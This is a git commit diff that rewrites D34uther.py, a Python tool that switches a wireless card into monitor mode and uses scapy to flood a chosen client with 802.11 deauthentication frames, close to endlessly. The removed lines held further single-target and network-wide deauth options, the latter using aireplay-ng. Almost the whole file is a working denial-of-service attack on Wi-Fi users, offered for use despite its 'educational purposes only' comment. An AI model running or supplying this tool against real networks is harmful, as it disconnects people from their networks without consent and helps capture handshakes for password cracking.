9417f19cf3e0a4c24a254c89316a070fc2158075
Fr0z3n <52989465+Eneajkl@users.noreply.github.com>
2022-02-20 01:59:55 +0000

    Add files via upload

--- D34uther.py
+++ D34uther.py
@@ -1,121 +1,58 @@
+#this is just a simple script for educational purposes only
 import subprocess
-from colorama import Fore, Back, Style
+from colorama import Fore
+from numpy import choose
 from scapy.all import *
 
-# Banner
+def banner():
+  print("""
+  ██████╗ ██████╗ ██╗  ██╗██╗   ██╗████████╗██╗  ██╗███████╗██████╗ 
+  ██╔══██╗╚════██╗██║  ██║██║   ██║╚══██╔══╝██║  ██║██╔════╝██╔══██╗
+  ██║  ██║ █████╔╝███████║██║   ██║   ██║   ███████║█████╗  ██████╔╝
+  ██║  ██║ ╚═══██╗╚════██║██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
+  ██████╔╝██████╔╝     ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║
+  ╚═════╝ ╚═════╝      ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+                                                                    
+  Maded by Fr0z3n
 
-print(Fore.LIGHTYELLOW_EX + """
-██████╗ ██████╗ ██╗  ██╗██╗   ██╗████████╗██╗  ██╗███████╗██████╗ 
-██╔══██╗╚════██╗██║  ██║██║   ██║╚══██╔══╝██║  ██║██╔════╝██╔══██╗
-██║  ██║ █████╔╝███████║██║   ██║   ██║   ███████║█████╗  ██████╔╝
-██║  ██║ ╚═══██╗╚════██║██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
-██████╔╝██████╔╝     ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║
-╚═════╝ ╚═════╝      ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
-                                                                  
-Maded by Fr0z3n
+  Version:1.0
 
-Version:0.7
+  """)
 
-""")
+def monitorModeOn():
+  subprocess.call(["service","NetworkManager","stop"])
+  subprocess.call(["ifconfig", interface, "down"])
+  subprocess.call(["iwconfig", interface, "mode", "monitor"])
+  subprocess.call(["ifconfig", interface, "up"])
+
+def monitorModeOff():
+  subprocess.call(["ifconfig", interface, "down"])
+  subprocess.call(["iwconfig", interface, "mode", "managed"])
+  subprocess.call(["ifconfig", interface, "up"])
+  subprocess.call(["service","NetworkManager","start"])
+
+print(Fore.LIGHTYELLOW_EX )
+banner()
 print(Fore.LIGHTRED_EX)
 
-# Gerekli bilgileri alıyoruz
-
-bssid=str(input("BSSID:"))
-
-target=str(input("Target's MAC (for specific target):"))
-
 interface=str(input("Interface:"))
-print("Target:"+target)
-print("BSSID: "+bssid)
-print("İnterface: "+interface)
 
-# Monitör moda geçiyoruz
+monitorModeOn()
 
-subprocess.call(["systemctl", "stop", "NetworkManager.service"])
-subprocess.call(["ifconfig", interface, "down"])
-subprocess.call(["iwconfig", interface, "mode", "monitor"])
-subprocess.call(["ifconfig", interface, "up"])
+bssid=str(input("BSSID: "))
+targetmac=str(input("Target's MAC address: "))
+choose=str(input("Start sending packets (Y/n)"))
+if choose == "Y" or choose == "y":
+  dot11 = Dot11(addr1=targetmac, addr2=bssid, addr3=bssid)
+  packet = RadioTap()/dot11/Dot11Deauth(reason=7)
+  sendp(packet, inter=0.1, count=99999999999999, iface=interface, verbose=1)
+  monitorModeOff()
+elif choose == "n" or choose == "N":
+  monitorModeOff()
 
 subprocess.call(["clear"])
-
-# Banner
-
-print(Fore.LIGHTYELLOW_EX)
-print("""
-██████╗ ██████╗ ██╗  ██╗██╗   ██╗████████╗██╗  ██╗███████╗██████╗ 
-██╔══██╗╚════██╗██║  ██║██║   ██║╚══██╔══╝██║  ██║██╔════╝██╔══██╗
-██║  ██║ █████╔╝███████║██║   ██║   ██║   ███████║█████╗  ██████╔╝
-██║  ██║ ╚═══██╗╚════██║██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
-██████╔╝██████╔╝     ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║
-╚═════╝ ╚═════╝      ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
-                                                                  
-Maded by Fr0z3n
-
-Version:0.7
-
-""")
-
-print(Fore.LIGHTBLUE_EX)
-print(Back.RED)
-
-# İşlemimizi seçiyoruz
-
-print("""
-
-1)for Handshake                                                
-2)for Deauthentication (single target)                         
-3)for Deauthentication (network)(you need aireplay-ng for this)
-99)Exit                                                        
-for Stop CTRL+C                                                """ + Style.RESET_ALL)
-
-print(Fore.LIGHTBLUE_EX)
-
-
-choose=int(input("Choose: "))
-print(Fore.LIGHTYELLOW_EX)
-if choose==1:
-  dot11 = Dot11(addr1=target, addr2=bssid, addr3=bssid)
-  packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-  sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)
-  subprocess.call(["systemctl", "start", "NetworkManager.service"])
-  subprocess.call(["ifconfig", interface, "down"])
-  subprocess.call(["iwconfig", interface, "mode", "managed"])
-  subprocess.call(["ifconfig", interface, "up"])
-  print("Thanks for Using D34uther")
-  exit
-if choose==2:
-  dot11 = Dot11(addr1=target, addr2=bssid, addr3=bssid)
-  packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-  sendp(packet, inter=0.1, count=99999999999, iface=interface, verbose=1)
-  subprocess.call(["systemctl", "start", "NetworkManager.service"])
-  subprocess.call(["ifconfig", interface, "down"])
-  subprocess.call(["iwconfig", interface, "mode", "managed"])
-  subprocess.call(["ifconfig", interface, "up"])
-  print("Thanks for Using D34uther")
-  exit
-if choose==3:
-  subprocess.call(["aireplay-ng", "--deauth", "0", "-a", bssid, interface])
-  subprocess.call(["systemctl", "start", "NetworkManager.service"])
-  subprocess.call(["ifconfig", interface, "down"])
-  subprocess.call(["iwconfig", interface, "mode", "managed"])
-  subprocess.call(["ifconfig", interface, "up"])
-  print("Thanks for Using D34uther")
-  exit
-if choose==99:
-  subprocess.call(["systemctl", "start", "NetworkManager.service"])
-  subprocess.call(["ifconfig", interface, "down"])
-  subprocess.call(["iwconfig", interface, "mode", "managed"])
-  subprocess.call(["ifconfig", interface, "up"])
-  exit
-else:
-  subprocess.call(["systemctl", "start", "NetworkManager.service"])
-  subprocess.call(["ifconfig", interface, "down"])
-  subprocess.call(["iwconfig", interface, "mode", "managed"])
-  subprocess.call(["ifconfig", interface, "up"])
-  print("Thanks for Using D34uther")
-  exit
-
-print(Style.RESET_ALL)
-
-input("Press Enter to Exit")
+print(Fore.LIGHTYELLOW_EX )
+banner()
+print(Fore.LIGHTRED_EX)
+print("\nSee you later...\nPress any key to exit")
+input()
